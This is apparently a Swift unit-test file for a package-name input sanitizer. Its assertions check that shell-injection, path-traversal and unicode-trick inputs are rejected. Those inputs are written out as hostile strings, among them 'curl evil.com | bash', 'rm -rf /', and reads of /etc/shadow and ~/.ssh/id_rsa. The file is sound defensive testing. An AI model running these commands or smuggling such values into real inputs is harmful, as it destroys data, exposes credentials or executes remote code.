import XCTest
@testable import Catalyst

/// Comprehensive InputSanitizer tests - NO MERCY approach
/// Tests every possible attack vector and edge case
final class InputSanitizerTests: XCTestCase {
    
    // MARK: - Valid Package Names
    
    func testValidPackageNames_Standard() {
        // Standard package names
        XCTAssertNotNil(InputSanitizer.sanitizePackageName("numpy"))
        XCTAssertNotNil(InputSanitizer.sanitizePackageName("requests"))
        XCTAssertNotNil(InputSanitizer.sanitizePackageName("flask"))
        XCTAssertNotNil(InputSanitizer.sanitizePackageName("Django"))
        XCTAssertNotNil(InputSanitizer.sanitizePackageName("Pillow"))
    }
    
    func testValidPackageNames_WithVersionSpecifiers() {
        // Homebrew versioned formulae
        XCTAssertNotNil(InputSanitizer.sanitizePackageName("python@3.12"))
        XCTAssertNotNil(InputSanitizer.sanitizePackageName("node@18"))
        XCTAssertNotNil(InputSanitizer.sanitizePackageName("ruby@3.0"))
        XCTAssertNotNil(InputSanitizer.sanitizePackageName("go@1.21"))
    }
    
    func testValidPackageNames_WithHyphensAndUnderscores() {
        XCTAssertNotNil(InputSanitizer.sanitizePackageName("my-package"))
        XCTAssertNotNil(InputSanitizer.sanitizePackageName("my_package"))
        XCTAssertNotNil(InputSanitizer.sanitizePackageName("my-package_v2"))
        XCTAssertNotNil(InputSanitizer.sanitizePackageName("some-long-package-name"))
        XCTAssertNotNil(InputSanitizer.sanitizePackageName("under_score_everywhere"))
    }
    
    func testValidPackageNames_WithDots() {
        XCTAssertNotNil(InputSanitizer.sanitizePackageName("package.subpackage"))
        XCTAssertNotNil(InputSanitizer.sanitizePackageName("a.b.c.d"))
        XCTAssertNotNil(InputSanitizer.sanitizePackageName("zope.interface"))
    }
    
    func testValidPackageNames_WithNumbers() {
        XCTAssertNotNil(InputSanitizer.sanitizePackageName("package123"))
        XCTAssertNotNil(InputSanitizer.sanitizePackageName("py3"))
        XCTAssertNotNil(InputSanitizer.sanitizePackageName("lib2to3"))
        XCTAssertNotNil(InputSanitizer.sanitizePackageName("oauth2client"))
    }
    
    // MARK: - Command Injection Attacks (MUST ALL FAIL)
    
    func testCommandInjection_ShellSubstitution() {
        // $(command) substitution
        XCTAssertNil(InputSanitizer.sanitizePackageName("$(whoami)"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("$(cat /etc/passwd)"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("$(rm -rf /)"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("pkg$(id)"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("$(curl evil.com)"))
    }
    
    func testCommandInjection_Backticks() {
        // `command` substitution
        XCTAssertNil(InputSanitizer.sanitizePackageName("`whoami`"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("`cat /etc/passwd`"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("pkg`id`"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("`rm -rf ~`"))
    }
    
    func testCommandInjection_Semicolons() {
        // Command chaining with ;
        XCTAssertNil(InputSanitizer.sanitizePackageName("pkg; rm -rf /"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("; cat /etc/shadow"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("numpy; curl evil.com | bash"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("a;b;c;d"))
    }
    
    func testCommandInjection_AndOperator() {
        // && chaining
        XCTAssertNil(InputSanitizer.sanitizePackageName("pkg && cat /etc/passwd"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("&& rm -rf /"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("numpy && whoami"))
    }
    
    func testCommandInjection_OrOperator() {
        // || chaining
        XCTAssertNil(InputSanitizer.sanitizePackageName("pkg || cat /etc/passwd"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("|| rm -rf /"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("false || true"))
    }
    
    func testCommandInjection_Pipes() {
        // Pipe injection
        XCTAssertNil(InputSanitizer.sanitizePackageName("pkg | grep secret"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("| cat /etc/passwd"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("a|b|c"))
    }
    
    func testCommandInjection_Redirects() {
        // Redirect injection
        XCTAssertNil(InputSanitizer.sanitizePackageName("pkg > /tmp/out"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("pkg < /etc/passwd"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("pkg >> /etc/crontab"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("pkg 2>&1"))
    }
    
    func testCommandInjection_Newlines() {
        // Newline injection (command on new line)
        XCTAssertNil(InputSanitizer.sanitizePackageName("pkg\nwhoami"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("pkg\r\nrm -rf /"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("\nmalicious"))
    }
    
    // MARK: - Special Characters (MUST ALL FAIL)
    
    func testSpecialCharacters_Punctuation() {
        XCTAssertNil(InputSanitizer.sanitizePackageName("pkg!name"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("pkg#name"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("pkg$name"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("pkg%name"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("pkg^name"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("pkg&name"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("pkg*name"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("pkg=name"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("pkg+name"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("pkg~name"))
    }
    
    func testSpecialCharacters_Brackets() {
        XCTAssertNil(InputSanitizer.sanitizePackageName("pkg(name)"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("pkg[name]"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("pkg{name}"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("pkg<name>"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("(pkg)"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("[pkg]"))
    }
    
    func testSpecialCharacters_Quotes() {
        XCTAssertNil(InputSanitizer.sanitizePackageName("pkg'name"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("pkg\"name"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("'pkg'"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("\"pkg\""))
        XCTAssertNil(InputSanitizer.sanitizePackageName("pkg`name"))
    }
    
    func testSpecialCharacters_Slashes() {
        XCTAssertNil(InputSanitizer.sanitizePackageName("pkg/name"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("pkg\\name"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("/etc/passwd"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("..\\..\\windows\\system32"))
    }
    
    // MARK: - Path Traversal Attacks (MUST ALL FAIL)
    
    func testPathTraversal() {
        XCTAssertNil(InputSanitizer.sanitizePackageName("/usr/bin/python"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("../../../etc/passwd"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("..%2F..%2F..%2Fetc%2Fpasswd"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("....//....//etc/passwd"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("/"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("~/.ssh/id_rsa"))
    }
    
    // MARK: - Edge Cases
    
    func testEdgeCases_Empty() {
        XCTAssertNil(InputSanitizer.sanitizePackageName(""))
    }
    
    func testEdgeCases_Whitespace() {
        XCTAssertNil(InputSanitizer.sanitizePackageName("   "))
        XCTAssertNil(InputSanitizer.sanitizePackageName("\t"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("\n"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("\r\n"))
        XCTAssertNil(InputSanitizer.sanitizePackageName(" \t\n "))
    }
    
    func testEdgeCases_WhitespaceAroundValid() {
        // Trimming should work
        let result = InputSanitizer.sanitizePackageName("  numpy  ")
        XCTAssertEqual(result, "numpy")
    }
    
    func testEdgeCases_SingleCharacter() {
        XCTAssertNotNil(InputSanitizer.sanitizePackageName("a"))
        XCTAssertNotNil(InputSanitizer.sanitizePackageName("Z"))
        XCTAssertNotNil(InputSanitizer.sanitizePackageName("9"))
    }
    
    func testEdgeCases_StartingWithNumber() {
        // Package names starting with numbers should be valid (PEP 508)
        XCTAssertNotNil(InputSanitizer.sanitizePackageName("3to2"))
        XCTAssertNotNil(InputSanitizer.sanitizePackageName("0mq"))
    }
    
    func testEdgeCases_VeryLongPackageName() {
        // Max length = 200
        let longValid = String(repeating: "a", count: 200)
        XCTAssertNotNil(InputSanitizer.sanitizePackageName(longValid))
        
        let tooLong = String(repeating: "a", count: 201)
        XCTAssertNil(InputSanitizer.sanitizePackageName(tooLong))
        
        let wayTooLong = String(repeating: "x", count: 10000)
        XCTAssertNil(InputSanitizer.sanitizePackageName(wayTooLong))
    }
    
    // MARK: - Unicode & Encoding Attacks
    
    func testUnicode_NonASCII() {
        // Non-ASCII should be rejected
        XCTAssertNil(InputSanitizer.sanitizePackageName("пакет")) // Russian
        XCTAssertNil(InputSanitizer.sanitizePackageName("包")) // Chinese
        XCTAssertNil(InputSanitizer.sanitizePackageName("پکیج")) // Persian
        XCTAssertNil(InputSanitizer.sanitizePackageName("📦")) // Emoji
        XCTAssertNil(InputSanitizer.sanitizePackageName("café")) // Accented
    }
    
    func testUnicode_Lookalikes() {
        // Homograph attacks - characters that look like ASCII but aren't
        XCTAssertNil(InputSanitizer.sanitizePackageName("numpy\u{200B}")) // Zero-width space
        XCTAssertNil(InputSanitizer.sanitizePackageName("nu\u{00AD}mpy")) // Soft hyphen
        XCTAssertNil(InputSanitizer.sanitizePackageName("nｕmpy")) // Fullwidth u
    }
    
    func testUnicode_NullBytes() {
        // Null byte injection
        XCTAssertNil(InputSanitizer.sanitizePackageName("pkg\0name"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("\0"))
        XCTAssertNil(InputSanitizer.sanitizePackageName("numpy\0; rm -rf /"))
    }
    
    // MARK: - Shell Escape Tests (via the public singleQuote wrapper)

    func testShellEscape_NoEscapeNeeded() {
        XCTAssertEqual(InputSanitizer.singleQuote("hello"), "'hello'")
        XCTAssertEqual(InputSanitizer.singleQuote("hello123"), "'hello123'")
        XCTAssertEqual(InputSanitizer.singleQuote("path/to/file"), "'path/to/file'")
    }

    func testShellEscape_SingleQuotes() {
        let quoted = InputSanitizer.singleQuote("it's")
        // Single quotes are escaped as '\'' inside the wrapping quotes.
        XCTAssertTrue(quoted.contains("'\\''"))
    }

    func testShellEscape_MultipleSingleQuotes() {
        let quoted = InputSanitizer.singleQuote("it's a 'test'")
        XCTAssertFalse(quoted == "it's a 'test'") // Should be different
    }

    func testShellEscape_Spaces() {
        let result = InputSanitizer.singleQuote("hello world")
        XCTAssertTrue(result.contains("hello") && result.contains("world"))
    }

    func testShellEscape_SpecialChars() {
        // These should be preserved in quotes, not stripped
        let input = "path with spaces"
        let quoted = InputSanitizer.singleQuote(input)
        XCTAssertTrue(quoted.contains("spaces"))
    }
    
    // MARK: - Single Quote Wrapper
    
    func testSingleQuote_Basic() {
        let result = InputSanitizer.singleQuote("hello")
        XCTAssertEqual(result, "'hello'")
    }
    
    func testSingleQuote_WithSingleQuote() {
        // "it's" -> "'it'\''s'"
        let result = InputSanitizer.singleQuote("it's")
        XCTAssertEqual(result, "'it'\\''s'")
        
        let complex = InputSanitizer.singleQuote("O'Reilly")
        XCTAssertEqual(complex, "'O'\\''Reilly'")
    }
    
    // MARK: - File Path Validation
    
    func testFilePath_ValidPaths() {
        XCTAssertTrue(InputSanitizer.isValidFilePath("/usr/bin/python"))
        XCTAssertTrue(InputSanitizer.isValidFilePath("/Users/test/file.txt"))
        XCTAssertTrue(InputSanitizer.isValidFilePath("./relative/path"))
        XCTAssertTrue(InputSanitizer.isValidFilePath("filename.txt"))
    }
    
    func testFilePath_DangerousPatterns() {
        XCTAssertFalse(InputSanitizer.isValidFilePath("/path; rm -rf /"))
        XCTAssertFalse(InputSanitizer.isValidFilePath("/path | cat"))
        XCTAssertFalse(InputSanitizer.isValidFilePath("/path & bg"))
        XCTAssertFalse(InputSanitizer.isValidFilePath("/path$(whoami)"))
        XCTAssertFalse(InputSanitizer.isValidFilePath("/path`id`"))
        XCTAssertFalse(InputSanitizer.isValidFilePath("/path\nwhoami"))
    }
    
    // MARK: - Function Name Validation
    
    func testFunctionName_Valid() {
        XCTAssertTrue(InputSanitizer.isValidFunctionName("myFunction"))
        XCTAssertTrue(InputSanitizer.isValidFunctionName("my_function"))
        XCTAssertTrue(InputSanitizer.isValidFunctionName("my-function"))
        XCTAssertTrue(InputSanitizer.isValidFunctionName("_private"))
        XCTAssertTrue(InputSanitizer.isValidFunctionName("Capitalized"))
    }
    
    func testFunctionName_Invalid() {
        XCTAssertFalse(InputSanitizer.isValidFunctionName("123func")) // Starts with number
        XCTAssertFalse(InputSanitizer.isValidFunctionName("-func"))   // Starts with dash
        XCTAssertFalse(InputSanitizer.isValidFunctionName("func!"))   // Special char
        XCTAssertFalse(InputSanitizer.isValidFunctionName(""))        // Empty
        XCTAssertFalse(InputSanitizer.isValidFunctionName("   "))     // Whitespace
    }
    
    // MARK: - PEP 503 Normalization
    
    func testPEP503_Lowercase() {
        XCTAssertEqual(InputSanitizer.normalizePipPackageName("NumPy"), "numpy")
        XCTAssertEqual(InputSanitizer.normalizePipPackageName("DJANGO"), "django")
    }
    
    func testPEP503_Underscores() {
        XCTAssertEqual(InputSanitizer.normalizePipPackageName("my_package"), "my-package")
    }
    
    func testPEP503_Dots() {
        XCTAssertEqual(InputSanitizer.normalizePipPackageName("zope.interface"), "zope-interface")
    }
    
    func testPEP503_ConsecutiveDashes() {
        XCTAssertEqual(InputSanitizer.normalizePipPackageName("my--package"), "my-package")
        XCTAssertEqual(InputSanitizer.normalizePipPackageName("a---b----c"), "a-b-c")
    }
    
    func testPEP503_Complex() {
        XCTAssertEqual(InputSanitizer.normalizePipPackageName("My_Package.Name"), "my-package-name")
    }
}
